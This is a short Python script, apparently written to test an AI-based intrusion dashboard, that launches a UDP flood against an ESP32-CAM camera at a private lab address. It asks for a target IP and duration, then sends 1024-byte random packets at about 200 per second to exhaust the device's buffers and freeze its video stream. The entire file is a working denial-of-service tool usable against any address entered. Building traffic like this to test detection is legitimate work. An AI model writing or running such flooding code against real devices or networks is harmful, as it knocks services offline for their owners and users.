import socket
import random
import time
import sys

def udp_flood(target_ip, target_port=80, duration=10):
    print(f"🔥 [DDoS] Initiating UDP Flood against ESP32-CAM ({target_ip}:{target_port})")
    print(f"⏱️ Duration: {duration} seconds")
    print("⚠️  WARNING: This will likely freeze the video stream instantly!")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # 1024 bytes of garbage data per packet to exhaust ESP32 RAM buffers
    payload = random.randbytes(1024) 
    
    end_time = time.time() + duration
    packets_sent = 0
    
    try:
        while True:
            if time.time() > end_time:
                break
            
            # Send garbage to completely exhaust ESP32 buffers
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            
            if packets_sent % 500 == 0:
                print(f"   -> Sent {packets_sent} packets...")
                
            time.sleep(0.005) # Throttle to 200 packets/sec to allow telemetry to flow back to Flask
            
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped manually.")
    
    sock.close()
    print(f"✅ Attack Complete. Fired {packets_sent} UDP packets!")
    print("👀 Check your AI Dashboard - it should flag a CRITICAL DDoS Attack!")

if __name__ == "__main__":
    ip = input("Enter Target ESP32-CAM IP (Default: 192.168.24.167): ")
    if not ip.strip():
        ip = "192.168.24.167"
    
    dur = input("Enter Duration in seconds (Default: 10): ")
    dur = int(dur) if dur.strip().isdigit() else 10
    
    udp_flood(ip, 80, dur)
